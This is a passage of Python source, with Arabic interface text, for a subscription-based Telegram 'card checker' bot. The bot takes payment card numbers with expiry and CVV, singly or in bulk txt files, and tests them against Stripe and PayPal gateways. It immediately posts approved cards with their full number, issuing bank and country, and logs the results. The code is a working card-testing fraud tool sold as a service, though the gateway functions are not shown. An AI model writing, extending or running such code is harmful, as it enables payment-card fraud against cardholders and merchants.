    for i, card in enumerate(cards, 1):
        # التحقق من طلب الإيقاف
        check = self.mass_manager.get_check(user_id)
        if not check or check.get('stop'):
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: bot.edit_message_text(
                    f"⛔ <b>تم إيقاف الفحص</b>\n━━━━━━━━━━━━\n✅ المقبولة: {check['approved'] if check else 0}\n❌ المرفوضة: {check['declined'] if check else 0}\n📊 تم فحص: {check['checked'] if check else 0}/{total_cards}",
                    chat_id,
                    message_id,
                    parse_mode='HTML'
                )
            )
            break
        
        try:
            current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
            
            # تحديث حالة "جاري الفحص" مع الأرقام الحالية
            current_progress = f"""
🚀 <b>جاري الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {total_cards}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

✅ <b>المقبولة:</b> {check['approved']}
❌ <b>المرفوضة:</b> {check['declined']}
🔄 <b>جاري فحص:</b> <code>{current_card}</code> ({i}/{total_cards})
━━━━━━━━━━━━
💡 استخدم /stop لإيقاف الفحص
"""
            
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: bot.edit_message_text(
                    current_progress,
                    chat_id,
                    message_id,
                    parse_mode='HTML',
                    reply_markup=self.ui.stop_button(int(time.time() * 1000))
                )
            )
            
            # فحص البطاقة
            approved, resp = await self.gateways.check_card(gate, card)
            
            # تحديث الإحصائيات
            check = self.mass_manager.get_check(user_id)
            if not check:
                break
            
            check['checked'] += 1
            
            # تنسيق نتيجة البطاقة
            card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
            all_results.append(card_result)
            
            if approved:
                check['approved'] += 1
                
                # إرسال البطاقة المقبولة فوراً
                number = card['number']
                masked = f"{number[:6]}xxxxxx{number[-4:]}"
                bin_info = Helpers.get_bin_info(number[:6])
                
                approved_msg = f"""
✅ <b>بطاقة مقبولة</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{card['original']}</code>
<b>🔢 الرقم المخفي:</b> <code>{masked}</code>
<b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
<b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
<b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
<b>🚪 البوابة:</b> {gate_name}
<b>📊 الحالة:</b> {resp}
━━━━━━━━━━━━
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
                )
                
                DataManager.save_card_result(card['original'], gate_name, resp, user_id, True)
                
            else:
                check['declined'] += 1
                DataManager.save_card_result(card['original'], gate_name, resp, user_id, False)
            
            DataManager.update_usage(user_id, gate, resp)
            
            # تحديث التقدم بعد الفحص (عرض الأرقام الجديدة)
            after_progress = f"""
🚀 <b>جاري الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {total_cards}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

✅ <b>المقبولة:</b> {check['approved']}
❌ <b>المرفوضة:</b> {check['declined']}
🔄 <b>تم فحص:</b> {check['checked']}/{total_cards}
━━━━━━━━━━━━
💡 استخدم /stop لإيقاف الفحص
"""
            
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: bot.edit_message_text(
                    after_progress,
                    chat_id,
                    message_id,
                    parse_mode='HTML',
                    reply_markup=self.ui.stop_button(int(time.time() * 1000))
                )
            )
            
            await asyncio.sleep(1.5)
            
        except Exception as e:
            print(f"Error: {e}")
            check = self.mass_manager.get_check(user_id)
            if check:
                check['checked'] += 1
                check['declined'] += 1
                card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
                all_results.append(card_result)
    
    # انتهاء الفحص - عرض النتائج النهائية
    check = self.mass_manager.get_check(user_id)
    if check and not check.get('stop'):
        # تجميع النتائج النهائية
        results_text = ResultFormatter.format_mass_result_header(total_cards, gate_name)
        results_text += "\n".join(all_results[:50])
        if len(all_results) > 50:
            results_text += f"\n\n... و {len(all_results) - 50} نتيجة أخرى"
        results_text += ResultFormatter.format_mass_result_footer(
            check['approved'], check['declined'], total_cards, 0
        )
        
        # إرسال النتائج النهائية
        try:
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: bot.edit_message_text(
                    results_text,
                    chat_id,
                    message_id,
                    parse_mode='HTML'
                )
            )
        except Exception as e:
            print(f"Error editing final message: {e}")
            await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: bot.send_message(chat_id, results_text, parse_mode='HTML')
            )
        
        # إرسال ملخص
        summary = f"""
✅ <b>اكتمل الفحص</b>
━━━━━━━━━━━━
📊 إجمالي البطاقات: {total_cards}
✅ المقبولة: {check['approved']}
❌ المرفوضة: {check['declined']}
📈 نسبة النجاح: {(check['approved']/total_cards*100) if total_cards > 0 else 0:.1f}%
━━━━━━━━━━━━
{'📌 تم إرسال البطاقات المقبولة فوراً' if check['approved'] > 0 else '❌ لا توجد بطاقات مقبولة'}
📁 تم حفظ النتائج في الملفات
"""
        
        await asyncio.get_event_loop().run_in_executor(
            None,
            lambda: bot.send_message(chat_id, summary, parse_mode='HTML')
        )
    
    # إزالة الفحص من المدير
    self.mass_manager.remove_check(user_id)
    
    def handle_single(self, message, gate):
        if not self.check_sub(message):
            return
        
        parts = message.text.strip().split(' ', 1)
        if len(parts) > 0 and '@' in parts[0]:
            parts[0] = parts[0].split('@')[0]
        
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv\nمثال: /{GATES[gate]['command']} 4111111111111111|12|25|123")
            return
        
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة\nالصيغة: رقم|شهر|سنة|cvv")
            return
        
        if not Helpers.luhn_check(card['number']):
            bot.reply_to(message, "❌ البطاقة غير صالحة (Luhn check failed)")
            return
        
        self.check_single_card(message, card, gate)
    
    def handle_mass(self, message, gate):
        if not self.check_sub(message):
            return
        
        if message.document:
            self.handle_file_upload(message, gate)
        else:
            last_file = self.get_last_file(message.from_user.id)
            if last_file:
                cards = Helpers.extract_cards_from_text(last_file["content"])
                if cards:
                    bot.reply_to(message, f"📁 استخدام آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}")
                    self.check_multiple_cards(message, cards, gate)
                else:
                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
            else:
                bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
    
    def handle_file_upload(self, message, gate=None):
        if not self.check_sub(message):
            return
        
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
            cards = Helpers.extract_cards_from_text(content)
            
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف")
                return
            
            self.save_last_file(message.from_user.id, message.document.file_id, message.document.file_name, content)
            
            if gate is None:
                gate = DataManager.get_user_default_gate(message.from_user.id)
            
            bot.reply_to(message, f"📁 تم استلام الملف: {message.document.file_name}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n🔄 جاري بدء الفحص...")
            
            self.check_multiple_cards(message, cards, gate)
            
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ في قراءة الملف: {str(e)[:50]}")
    
    def check_last_file(self, message):
        user_id = message.from_user.id
        last_file = self.get_last_file(user_id)
        
        if not last_file:
            bot.reply_to(message, "❌ لم تقم بإرسال أي ملف من قبل\nأرسل ملف txt أولاً ثم استخدم هذا الأمر")
            return
        
        cards = Helpers.extract_cards_from_text(last_file["content"])
        
        if not cards:
            bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
            return
        
        gate = DataManager.get_user_default_gate(user_id)
        
        bot.reply_to(message, f"📁 جاري فحص آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}")
        
        self.check_multiple_cards(message, cards, gate)
    
    def handle_add_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ الصيغة: /addsub [ايدي المستخدم] [المدة بالأيام]\nمثال: /addsub 123456789 30")
                return
            
            user_id = int(parts[1])
            days = int(parts[2]) if len(parts) > 2 else 30
            
            if DataManager.add_subscription(user_id, days):
                try:
                    bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك لمدة {days} يوم بنجاح!\nاستمتع بفحص البطاقات.")
                except:
                    pass
                
                bot.reply_to(message, f"""
✅ <b>تم إضافة الاشتراك بنجاح</b>
━━━━━━━━━━━━
👤 <b>المستخدم:</b> <code>{user_id}</code>
📅 <b>المدة:</b> {days} يوم
📆 <b>ينتهي:</b> {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}
━━━━━━━━━━━━
تم إشعار المستخدم.
""", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ فشل في إضافة الاشتراك")
                
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")
    
    def handle_remove_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ الصيغة: /removesub [ايدي المستخدم]")
                return
            
            user_id = int(parts[1])
            
            if DataManager.remove_subscription(user_id):
                try:
                    bot.send_message(user_id, "⚠️ تم إلغاء اشتراكك. للاشتراك مرة أخرى تواصل مع المطور.")
                except:
                    pass
                
                bot.reply_to(message, f"✅ تم إزالة اشتراك المستخدم <code>{user_id}</code>", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ فشل في إزالة الاشتراك")
                
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        data = call.data
        uid = call.from_user.id
        
        if data == "back_main":
            chat_type = Helpers.get_chat_type(call.message.chat.id)
            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.main_menu(chat_type), parse_mode='HTML')
        
        elif data == "my_profile":
            self.handler.handle_profile(call.message)
        
        elif data == "stats":
            self.handler.handle_stats(call.message)
        
        elif data == "subscribe":
            sub = DataManager.get_user_subscription(uid)
            if sub:
                expiry_date = sub.get('expiry', '')
                if expiry_date and expiry_date != "2099-12-31":
                    remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                    text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
                else:
                    text = "💎 لديك اشتراك دائم (Lifetime)"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     reply_markup=UserInterface.back_button())
            else:
                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
                text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='HTML', reply_markup=UserInterface.back_button())
        
        elif data == "default_gate":
            self.handler.handle_default_gate(call.message)
        
        elif data == "mass_check":
            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m أو /paym لفحص آخر ملف",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.back_button())
        
        elif data == "check_last_file":
            self.handler.check_last_file(call.message)
            bot.answer_callback_query(call.id)
        
        elif data.startswith("set_default_"):
            gate_id = data.replace("set_default_", "")
            self.handler.handle_set_default_gate(call, gate_id)
        
        elif data.startswith("gate_"):
            gate = data.replace("gate_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                  call.message.chat.id, call.message.message_id,
                                  parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
        
        elif data.startswith("stop_"):
            cid = int(data.replace("stop_", ""))
            self.handler.mass_manager.stop_check(cid)
            bot.answer_callback_query(call.id, "⛔ جاري إيقاف الفحص...")

# ==================== إعداد البوت ====================
def setup():
    DataManager.init_files()
    
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['help'])
    def help(m): 
        chat_type = Helpers.get_chat_type(m.chat.id)
        if chat_type == "private":
            bot.reply_to(m, "📚 أرسل البطاقة مباشرة أو استخدم /start للقائمة الرئيسية")
        else:
            bot.reply_to(m, f"📚 أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>", parse_mode='HTML')
    
    @bot.message_handler(commands=['stop'])
    def stop(m): handler.handle_stop(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['subscribe'])
    def sub(m): handler.handle_subscribe(m)
    
    @bot.message_handler(commands=['default'])
    def default(m): handler.handle_default_gate(m)
    
    @bot.message_handler(commands=['lastfile'])
    def lastfile(m): handler.check_last_file(m)
    
    @bot.message_handler(commands=['addsub'])
    def addsub(m): handler.handle_add_sub(m)
    
    @bot.message_handler(commands=['removesub'])
    def removesub(m): handler.handle_remove_sub(m)
    
    # Stripe v1 commands
    @bot.message_handler(commands=['st1'])
    def stripe1(m): handler.handle_single(m, 'stripe1')
    
    @bot.message_handler(commands=['st1m'])
    def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
    
    # Stripe v2 commands
    @bot.message_handler(commands=['st2'])
    def stripe2(m): handler.handle_single(m, 'stripe2')
    
    @bot.message_handler(commands=['st2m'])
    def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
    
    # PayPal commands
    @bot.message_handler(commands=['pay'])
    def paypal(m): handler.handle_single(m, 'paypal')
    
    @bot.message_handler(commands=['paym'])
    def paypal_mass(m): handler.handle_mass(m, 'paypal')
    
    @bot.message_handler(content_types=['document'])
    def handle_document(m):
        if not handler.check_sub(m):
            return
        handler.handle_file_upload(m)
    
    @bot.message_handler(func=lambda m: True)
    def handle_text(m):
        if not handler.check_sub(m):
            return
        
        text = m.text.strip()
        
        if f"@{BOT_USERNAME}" in text:
            text = text.replace(f"@{BOT_USERNAME}", "").strip()
        
        cards = Helpers.extract_cards_from_text(text)
        
        if cards:
            if len(cards) == 1:
                handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
            else:
                bot.reply_to(m, f"📝 تم العثور على {len(cards)} بطاقة في النص\n🔄 جاري بدء الفحص المتسلسل...")
                handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
        else:
            if Helpers.get_chat_type(m.chat.id) == "private":
                bot.reply_to(m, "⚠️ أمر غير معروف\n\n💡 يمكنك إرسال البطاقة مباشرة بالصيغة:\n<code>4111111111111111|12|25|123</code>\n\nأو إرسال ملف txt للفحص التلقائي",
                            parse_mode='HTML', reply_markup=UserInterface.main_menu("private"))
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    def run_health():
        port = int(os.environ.get('PORT', 10000))
        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
            print(f"🌐 Health check on {port}")
            httpd.serve_forever()
    
    threading.Thread(target=run_health, daemon=True).start()
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
    print(Fore.YELLOW + "📌 البوابات المتاحة:" + Style.RESET_ALL)
    print(Fore.WHITE + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
    print(Fore.WHITE + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
    print(Fore.WHITE + "   💸 PayPal Charge: /pay (فردي) | /paym (ملف)" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
    print(Fore.YELLOW + "📌 الأوامر الإضافية:" + Style.RESET_ALL)
    print(Fore.WHITE + "   /stop - إيقاف الفحص الحالي" + Style.RESET_ALL)
    print(Fore.WHITE + "   /lastfile - فحص آخر ملف تم إرساله" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
    print(Fore.GREEN + "✅ البوت جاهز للعمل!" + Style.RESET_ALL)
    
    bot.infinity_polling()

# ==================== التشغيل ====================
if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
